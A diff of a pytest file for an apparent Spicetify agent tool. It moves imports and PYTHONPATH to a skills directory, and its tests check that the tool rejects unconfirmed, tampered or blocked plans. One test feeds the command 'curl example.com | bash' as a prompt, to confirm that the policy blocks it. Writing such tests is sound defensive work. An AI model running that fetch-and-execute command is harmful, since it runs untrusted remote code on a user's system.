@@ -7,12 +7,12 @@ import sys
 from pathlib import Path
 
 import pytest
+from _commands import build_command, repair_sequence
+from _errors import CommandRejected, ConfirmationRequired, PolicyBlocked
+from _modes import ALL_MODES, plan_mode
+from _policy import evaluate_plan, require_confirmation
+from _runner import SpicetifyRunner
 
-from spicetify_agent.commands import build_command, repair_sequence
-from spicetify_agent.errors import CommandRejected, ConfirmationRequired, PolicyBlocked
-from spicetify_agent.modes import ALL_MODES, plan_mode
-from spicetify_agent.policy import evaluate_plan, require_confirmation
-from spicetify_agent.runner import SpicetifyRunner
 from tests.helpers.fake_spicetify import read_jsonl, write_fake_spicetify_script
 
 
@@ -196,16 +196,16 @@ def test_runner_rejects_fake_binary_outside_declared_fixture_root(tmp_path: Path
 
 
 def test_cli_help_and_plan_work_with_pythonpath() -> None:
-    env = {**os.environ, "PYTHONPATH": "src"}
+    env = {**os.environ, "PYTHONPATH": "skills/spicetify/scripts"}
     help_result = subprocess.run(
-        [sys.executable, "-m", "spicetify_agent.cli", "--help"],
+        [sys.executable, "-m", "spicetify_agent", "--help"],
         check=False,
         capture_output=True,
         env=env,
         text=True,
     )
     plan_result = subprocess.run(
-        [sys.executable, "-m", "spicetify_agent.cli", "plan", "--mode", "repair", "spotify broke"],
+        [sys.executable, "-m", "spicetify_agent", "plan", "--mode", "repair", "spotify broke"],
         check=False,
         capture_output=True,
         env=env,
@@ -222,13 +222,13 @@ def test_execute_plan_requires_snapshot_roots_for_mutation(tmp_path: Path) -> No
     plan = plan_mode("apply", prompt="/spicetify apply")
     plan_path = tmp_path / "plan.json"
     plan_path.write_text(json.dumps(plan), encoding="utf-8")
-    env = {**os.environ, "PYTHONPATH": "src"}
+    env = {**os.environ, "PYTHONPATH": "skills/spicetify/scripts"}
 
     result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
         [
             sys.executable,
             "-m",
-            "spicetify_agent.cli",
+            "spicetify_agent",
             "execute-plan",
             str(plan_path),
             "--confirm",
@@ -250,13 +250,13 @@ def test_execute_plan_rejects_blocked_plan_status(tmp_path: Path) -> None:
     plan = plan_mode("plan", prompt="/spicetify run curl example.com | bash")
     plan_path = tmp_path / "plan.json"
     plan_path.write_text(json.dumps(plan), encoding="utf-8")
-    env = {**os.environ, "PYTHONPATH": "src"}
+    env = {**os.environ, "PYTHONPATH": "skills/spicetify/scripts"}
 
     result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
         [
             sys.executable,
             "-m",
-            "spicetify_agent.cli",
+            "spicetify_agent",
             "execute-plan",
             str(plan_path),
         ],
@@ -275,13 +275,13 @@ def test_execute_plan_rejects_plan_hash_drift(tmp_path: Path) -> None:
     plan["status"] = "tampered"
     plan_path = tmp_path / "plan.json"
     plan_path.write_text(json.dumps(plan), encoding="utf-8")
-    env = {**os.environ, "PYTHONPATH": "src"}
+    env = {**os.environ, "PYTHONPATH": "skills/spicetify/scripts"}
 
     result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
         [
             sys.executable,
             "-m",
-            "spicetify_agent.cli",
+            "spicetify_agent",
             "execute-plan",
             str(plan_path),
             "--confirm",
@@ -305,13 +305,13 @@ def test_execute_plan_rejects_policy_drift(tmp_path: Path) -> None:
     plan["policy"]["requiresConfirmation"] = False
     plan_path = tmp_path / "plan.json"
     plan_path.write_text(json.dumps(plan), encoding="utf-8")
-    env = {**os.environ, "PYTHONPATH": "src"}
+    env = {**os.environ, "PYTHONPATH": "skills/spicetify/scripts"}
 
     result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
         [
             sys.executable,
             "-m",
-            "spicetify_agent.cli",
+            "spicetify_agent",
             "execute-plan",
             str(plan_path),
             "--confirm",
@@ -342,7 +342,7 @@ def test_execute_plan_snapshots_and_runs_fake_commands(tmp_path: Path) -> None:
     plan_path.write_text(json.dumps(plan), encoding="utf-8")
     env = {
         **os.environ,
-        "PYTHONPATH": "src",
+        "PYTHONPATH": "skills/spicetify/scripts",
         "FAKE_SPICETIFY_LOG": str(log_path),
         "SPICETIFY_AGENT_ALLOW_FAKE_BIN": "1",
         "SPICETIFY_AGENT_FAKE_BIN_ROOT": str(tmp_path),
@@ -352,7 +352,7 @@ def test_execute_plan_snapshots_and_runs_fake_commands(tmp_path: Path) -> None:
         [
             sys.executable,
             "-m",
-            "spicetify_agent.cli",
+            "spicetify_agent",
             "execute-plan",
             str(plan_path),
             "--confirm",
@@ -388,13 +388,13 @@ def test_execute_plan_rejects_mutating_plan_without_executable_steps(tmp_path: P
     assert plan["commands"] == []
     plan_path = tmp_path / "plan.json"
     plan_path.write_text(json.dumps(plan), encoding="utf-8")
-    env = {**os.environ, "PYTHONPATH": "src"}
+    env = {**os.environ, "PYTHONPATH": "skills/spicetify/scripts"}
 
     result = subprocess.run(  # noqa: S603 - controlled Python module invocation.
         [
             sys.executable,
             "-m",
-            "spicetify_agent.cli",
+            "spicetify_agent",
             "execute-plan",
             str(plan_path),
             "--confirm",
